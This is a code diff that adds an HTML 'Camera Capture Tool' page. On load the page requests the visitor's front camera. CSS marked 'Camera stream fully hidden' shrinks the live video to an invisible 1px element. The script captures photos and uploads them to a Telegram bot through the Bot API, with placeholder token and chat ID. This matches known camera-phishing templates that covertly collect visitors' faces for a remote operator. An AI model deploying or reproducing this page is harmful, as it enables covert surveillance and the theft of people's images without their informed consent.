@@ -1,1 +1,171 @@
-hhhhhh
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Capture</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background-color: #f0f0f0;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+
+        /* 🔥 Camera stream fully hidden */
+        video, #video {
+            position: absolute !important;
+            width: 1px !important;
+            height: 1px !important;
+            opacity: 0 !important;
+            pointer-events: none !important;
+        }
+
+        canvas {
+            width: 100%;
+            max-width: 400px;
+            height: auto;
+            border-radius: 5px;
+            background: #333;
+        }
+        button {
+            background-color: #4CAF50;
+            border: none;
+            color: white;
+            padding: 15px 32px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 10px 2px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+        #status {
+            margin-top: 15px;
+            font-weight: bold;
+            min-height: 24px;
+        }
+        .preview-container {
+            position: relative;
+            margin: 20px 0;
+        }
+        .preview-image {
+            max-width: 100%;
+            max-height: 300px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Camera Capture Tool</h1>
+        <p>Click allow when prompted to access your camera</p>
+        
+        <div class="preview-container">
+            <video id="video" autoplay playsinline></video>
+            <img id="preview" class="preview-image" alt="Preview">
+        </div>
+        
+        <button id="captureBtn">Capture Photo</button>
+        <button id="sendBtn" disabled>Send to Telegram</button>
+        
+        <div id="status">Ready to access camera</div>
+    </div>
+
+    <script>
+        const video = document.getElementById('video');
+        const preview = document.getElementById('preview');
+        const captureBtn = document.getElementById('captureBtn');
+        const sendBtn = document.getElementById('sendBtn');
+        const statusDiv = document.getElementById('status');
+
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+
+        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
+        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
+
+        let stream = null;
+
+        async function initCamera() {
+            try {
+                statusDiv.textContent = 'Accessing camera...';
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' } 
+                });
+                video.srcObject = stream;
+                statusDiv.textContent = 'Camera ready. Click capture to take photo.';
+                captureBtn.disabled = false;
+            } catch (err) {
+                statusDiv.textContent = 'Error: Could not access camera.';
+                captureBtn.disabled = true;
+            }
+        }
+
+        function captureImage() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const imageDataUrl = canvas.toDataURL('image/png');
+            preview.src = imageDataUrl;
+            preview.style.display = 'block';
+
+            statusDiv.textContent = 'Photo captured. Click Send to Telegram.';
+            sendBtn.disabled = false;
+        }
+
+        async function sendToTelegram() {
+            try {
+                statusDiv.textContent = 'Sending to Telegram...';
+                sendBtn.disabled = true;
+
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('chat_id', TELEGRAM_CHAT_ID);
+                    formData.append('photo', blob, 'captured_image.png');
+
+                    const response = await fetch(
+                        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
+                        { method: 'POST', body: formData }
+                    );
+
+                    const result = await response.json();
+
+                    if (result.ok) {
+                        statusDiv.textContent = 'Image sent successfully!';
+                        setTimeout(() => {
+                            preview.style.display = 'none';
+                            sendBtn.disabled = true;
+                            statusDiv.textContent = 'Ready for another capture.';
+                        }, 3000);
+                    } else {
+                        throw new Error(result.description || 'Unknown error');
+                    }
+                }, 'image/png');
+            } catch (error) {
+                statusDiv.textContent = `Error: ${error.message}`;
+                sendBtn.disabled = false;
+            }
+        }
+
+        captureBtn.addEventListener('click', captureImage);
+        sendBtn.addEventListener('click', sendToTelegram);
+
+        window.addEventListener('load', initCamera);
+    </script>
+</body>
+</html>
